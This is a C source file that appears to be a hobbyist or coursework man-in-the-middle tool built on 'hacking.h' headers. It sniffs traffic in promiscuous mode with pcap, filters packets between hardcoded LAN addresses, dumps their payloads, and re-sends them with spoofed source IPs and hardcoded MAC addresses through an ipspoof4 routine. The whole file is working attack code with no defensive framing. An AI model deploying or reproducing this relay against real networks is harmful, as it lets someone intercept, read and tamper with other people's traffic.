#include <netinet/in.h>
#include <pcap.h>
#include "hacking.h"
#include "hacking-network.h"
#include "raw_ethernet.c"


void pcap_fatal(const char *, const char *);
int decode_ethernet(const u_char *, struct ether_header *, char *);
void decode_ip(const u_char *);
u_int decode_tcp(const u_char *header_start,struct tcphdr *TCPheader, char *) ;

void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);

int main() {
	struct pcap_pkthdr cap_header;
	const u_char *packet, *pkt_data;
	char errbuf[PCAP_ERRBUF_SIZE];
	char *device;

	pcap_t *pcap_handle;
	
	device = pcap_lookupdev(errbuf);
	if(device == NULL)
		pcap_fatal("pcap_lookupdev", errbuf);

	printf("Sniffing on device %s\n", device);
	
	pcap_handle = pcap_open_live(device, 4096, 1, 0, errbuf);
	if(pcap_handle == NULL)
		pcap_fatal("pcap_open_live", errbuf);
	
	pcap_loop(pcap_handle, -1, caught_packet, NULL);

	pcap_close(pcap_handle);
}

void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet) {
	int tcp_header_length, total_header_size, pkt_data_len;
	u_char *pkt_data;

	int total_header_size2;

	int ether_type;

	//structs of the packet (different protocol headers)
	struct ether_header *ETHERheader;
	struct ip *IPheader;
	struct tcphdr *TCPheader;
	//copy of the packet 
	char * packet_copy;
	packet_copy = malloc(cap_header->len);
	if (packet_copy <= 0 )
		exit(-1);

	memcpy(packet_copy,packet,cap_header->len);
	
	//printf("==== Got a %d byte packet ====\n", cap_header->len);


	//ETHERNET
	ether_type = decode_ethernet(packet,ETHERheader,packet_copy);
	//if not a IPv4 packet stop.
	if (ether_type != 2048){
		return;
	}



	//IP
	IPheader =  (struct ip *)(packet_copy+ETHER_HDR_LEN);
	decode_ip(packet+ETHER_HDR_LEN);
	//comprovacions ip
	if ((0 == strcmp(inet_ntoa(IPheader->ip_dst),"192.168.1.13") && 0 == strcmp(inet_ntoa(IPheader->ip_src),"192.168.1.14")) || (0 == strcmp(inet_ntoa(IPheader->ip_dst),"1.2.3.4") && 0 == strcmp(inet_ntoa(IPheader->ip_src),"192.168.1.13"))  ){	

	
		//ETHERNET		
		tcp_header_length = decode_tcp(packet+ETHER_HDR_LEN+sizeof(struct ip_hdr),TCPheader, packet_copy+ETHER_HDR_LEN+sizeof(struct ip));
		//comprobacions tcp?


		total_header_size = ETHER_HDR_LEN+sizeof(struct ip_hdr)+tcp_header_length;
		total_header_size2 = ETHER_HDR_LEN+sizeof(struct ip)+tcp_header_length;
			
		printf("total_header_size:%d \n total_header_size2:%d \n",total_header_size,total_header_size2);

		pkt_data = (u_char *)packet + total_header_size;  // pkt_data points to the data portion
		pkt_data_len = cap_header->len - total_header_size;
		/*
		if(pkt_data_len > 0) {
			printf("\t\t\t%u bytes of packet data\n", pkt_data_len);
			//dump(pkt_data, pkt_data_len);
			//dump(packet, cap_header->len);
		} else {
			printf("\t\t\tNo Packet Data\n");
			//dump(packet, cap_header->len);
		}	
		*/

		if (0 == strcmp(inet_ntoa(IPheader->ip_dst),"192.168.1.13")){
			if(pkt_data_len > 0) {
				dump(packet, cap_header->len);
			}			

			ipspoof4( "192.168.1.14", "192.168.1.13", "0022433967e9", (char *)packet, cap_header->len);
			
			printf(" sending to 192.168.1.13 \n");
		}

		if (0 == strcmp(inet_ntoa(IPheader->ip_dst),"192.168.1.14")){
			if(pkt_data_len > 0) {
				dump(packet, cap_header->len);
			}
	
//			ipspoof4( "", "192.168.1.1", "00789e49621b", (char *)packet, cap_header->len);
			ipspoof4( "192.168.1.13", "192.168.1.14", "701a04d83403", (char *)packet, cap_header->len);

			printf(" sending 192.168.1.14   \n");
		}
		
	}
	free(packet_copy);
}

void pcap_fatal(const char *failed_in, const char *errbuf) {
	printf("Fatal Error in %s: %s\n", failed_in, errbuf);
	exit(1);
}

int decode_ethernet(const u_char *header_start, struct ether_header *eh, char * pointer) {
	int i;
	const struct ether_hdr *ethernet_header;
	
	eh = (struct ether_header *)pointer;

	ethernet_header = (const struct ether_hdr *)header_start;
	/*	
	printf("[[  Layer 2 :: Ethernet Header  ]]\n");
	printf("[ Source: %02x", ethernet_header->ether_src_addr[0]);
	for(i=1; i < ETHER_ADDR_LEN; i++)
		printf(":%02x", ethernet_header->ether_src_addr[i]);

	printf("\tDest: %02x", ethernet_header->ether_dest_addr[0]);
	for(i=1; i < ETHER_ADDR_LEN; i++)
		printf(":%02x", ethernet_header->ether_dest_addr[i]);
	// estava al revÃ©s: type 0x0806 surt 0x0608 = 1544, 0x0800 surt 8 = 0x0008
	//afegit ntohs()
	printf("\tType: %hu ]\n", ntohs(ethernet_header->ether_type));
	*/
	
	return ntohs(ethernet_header->ether_type);
}

void decode_ip(const u_char *header_start) {
	const struct ip_hdr *ip_header;

	//struct in_addr *inaddr1, *inaddr2;

	
	ip_header = (const struct ip_hdr *)header_start;
	printf("\t((  Layer 3 ::: IP Header  ))\n");


	printf("\t( Source: %s",inet_ntoa(*(struct in_addr *)&(ip_header->ip_src_addr)) );
	printf("\t Dest: %s)\n",inet_ntoa(*(struct in_addr *)&(ip_header->ip_dest_addr)) );




	printf("\t( Type: %u\t", (u_int) ip_header->ip_type);
	printf("ID: %hu\tLength: %hu )\n", ntohs(ip_header->ip_id), ntohs(ip_header->ip_len));
}

u_int decode_tcp(const u_char *header_start,struct tcphdr *TCPheader, char * pointer) {
	u_int header_size;
	const struct tcp_hdr *tcp_header;

	TCPheader =  (struct tcphdr *)pointer;
	tcp_header = (const struct tcp_hdr *)header_start;
	header_size = 4 * tcp_header->tcp_offset;
	
	printf("\t\t{{  Layer 4 :::: TCP Header  }}\n");
	printf("\t\t{ Src Port: %hu\t", ntohs(tcp_header->tcp_src_port));
	printf("Dest Port: %hu }\n", ntohs(tcp_header->tcp_dest_port));
	printf("\t\t{ Seq #: %u\t", ntohl(tcp_header->tcp_seq));
	printf("Ack #: %u }\n", ntohl(tcp_header->tcp_ack));
	printf("\t\t{ Header Size: %u\tFlags: ", header_size);
	if(tcp_header->tcp_flags & TCP_FIN)
		printf("FIN ");
	if(tcp_header->tcp_flags & TCP_SYN)
		printf("SYN ");
	if(tcp_header->tcp_flags & TCP_RST)
		printf("RST ");
	if(tcp_header->tcp_flags & TCP_PUSH)
		printf("PUSH ");
	if(tcp_header->tcp_flags & TCP_ACK)
		printf("ACK ");
	if(tcp_header->tcp_flags & TCP_URG)
		printf("URG ");
	printf(" }\n");

	return header_size;
}
	


